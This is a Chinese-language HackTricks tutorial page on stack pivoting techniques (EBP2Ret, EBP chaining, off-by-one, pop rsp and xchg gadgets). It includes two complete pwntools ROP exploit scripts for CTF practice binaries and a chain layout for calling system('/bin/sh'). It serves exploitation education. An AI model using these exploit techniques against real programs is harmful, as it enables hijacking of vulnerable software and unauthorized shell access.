# 栈转移 - EBP2Ret - EBP链接

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

这种技术利用了操纵**基指针（EBP）**的能力，通过精心使用EBP寄存器和`leave; ret`指令序列来链接执行多个函数。

作为提醒，**`leave`**基本上意味着：
```
movl               %ebp, %esp
popl               %ebp
ret
```
由于**EBP在EIP之前位于堆栈中**，因此可以通过控制堆栈来控制它。

### EBP2Ret

当您可以**更改EBP寄存器但无法直接更改EIP寄存器**时，此技术特别有用。它利用函数执行完毕时的行为。

如果在`fvuln`执行期间，您成功在堆栈中注入一个指向内存中包含您的shellcode地址的区域的**伪造EBP**（再加上4个字节以考虑`pop`操作），则可以间接控制EIP。当`fvuln`返回时，ESP设置为此精心构造的位置，并且随后的`pop`操作将ESP减少4，有效地使其指向您的shellcode。当执行`ret`指令时，控制将转移到您的shellcode。

#### 攻击构造

首先，您需要**在可执行内存中的某处注入您的shellcode**并**获取地址**，或获取到有效的[**ONE\_GADGET**](https://github.com/david942j/one\_gadget)的地址，或使ESP指向一个包含`system()`地址后跟**4个垃圾字节**和`"/bin/sh"`地址的位置。

然后，创建填充并使用`shellcode/one_gadget地址 - 4`来**破坏EBP**。必须是`-4`，因为有`pop`操作。然后，ESP将指向我们期望的地址，`ret`将被执行。

#### Off-By-One Exploit

这种技术的一个特定变体称为“Off-By-One Exploit”。当您**只能修改EBP的最低有效字节**时，可以使用它。在这种情况下，存储shellcode地址的内存位置必须与EBP的前三个字节共享，从而允许在更受限制的条件下进行类似的操作。

### **EBP Chaining**

因此，在堆栈的`EBP`条目中放置一个受控地址，并在`EIP`中放置一个`leave; ret`的地址，就可以**将`ESP`移动到堆栈中受控的`EBP`地址**。

现在，**`ESP`**受控地指向一个期望的地址，下一个要执行的指令是`RET`。为了滥用这一点，可以在受控ESP位置放置以下内容：

* **`&(下一个伪造EBP)`** -> 加载新的EBP，因为`leave`指令中有`pop ebp`
* **`system()`** -> 被`ret`调用
* **`&(leave;ret)`** -> 在system结束后调用，它将将ESP移动到伪造的EBP并重新开始
* **`&("/bin/sh")`**-> 用于`system`的参数

基本上，通过这种方式，可以链接多个伪造的EBP以控制程序的流程。

老实说，这有点像[ret2lib](ret2lib/)，但更复杂，没有明显的好处，但在某些边缘情况下可能会很有趣。

此外，这里有一个使用此技术的**堆栈泄漏**调用获胜函数的[**挑战示例**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)。这是页面上的最终有效载荷：
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## 控制 RSP 的其他方法

### **`pop rsp`** 机关

[**在这个页面**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp)中，您可以找到使用这种技术的示例。对于这个挑战，需要调用一个带有两个特定参数的函数，并且有一个**`pop rsp` 机关**以及**来自堆栈的泄漏**：
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<rag>, rsp 机关
```
pop <reg>                <=== return pointer
<reg value>
xchg <rag>, rsp
```
## 参考资料

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
